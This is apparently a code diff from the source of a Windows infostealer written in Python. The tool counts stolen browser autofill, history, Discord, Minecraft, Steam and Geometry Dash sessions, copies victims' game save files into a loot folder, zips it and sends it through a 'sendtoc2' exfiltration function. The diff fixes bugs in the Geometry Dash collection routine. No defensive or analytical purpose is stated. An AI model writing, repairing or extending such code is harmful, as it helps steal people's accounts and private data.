@@ -10,8 +10,8 @@ import zipfile
 import win32crypt
 import psutil
 import shutil
-import sys
 import json
+import sys
 import requests
 import subprocess
 import random
@@ -94,7 +94,7 @@ autofill_count: int = 0
 browsing_history: int = 0
 discord_accounts: int = 0
 minecraft_sessions: int = 0
-gd_session: int = 0
+gd_session = 0
 steam_session = 0
 ss_success = 0
 
@@ -740,25 +740,31 @@ def makepath():
         return None
 
 def collectgeometrydash():
+    global gd_session
+
     if config.games:
         gdpath = os.path.join(os.getenv('localappdata'), 'GeometryDash', 'CCGameManager.dat')
         gdlevelpath = os.path.join(os.getenv('localappdata'), 'GeometryDash', 'CCLocalLevels.dat')
         gdoutput = os.path.join(output, 'Geometry Dash')
+        os.makedirs(gdoutput, exist_ok=True)
         if os.path.exists(gdpath):
             try:
                 shutil.copy2(gdpath, os.path.join(gdoutput, os.path.basename(gdpath)))
                 gd_session = 1
             except:
                 pass
+            
+            try:
+                write(os.path.join(gdoutput, 'note.txt'), 'I recommend using https://gdcolon.com/gdsave/ if you wanna get data from the save files, otherwise just replace your geometry dash save files with the one shown here')
+            except Exception as e:
+                print('Failed to write', e)
+                pass
         if os.path.exists(gdlevelpath):
             try:
                 shutil.copy2(gdlevelpath, os.path.join(gdoutput, os.path.basename(gdlevelpath)))
             except:
                 pass
-        try:
-            write(os.path.join(gdoutput, 'note.txt'), 'I recommend using https://gdcolon.com/gdsave/ if you wanna get data from the save files, otherwise just replace your geometry dash save files with the one shown here')
-        except:
-            pass
+
 
 def collectsteam():
     if config.games:
@@ -814,6 +820,7 @@ zip_folder(output, zip_)
     
     
 def sendtoc2(file):
+    print(gd_session)
     stores = ['store1', 'store2', 'store3', 'store4', 'store5']
     with open(file, 'rb') as f:
         for store in stores:
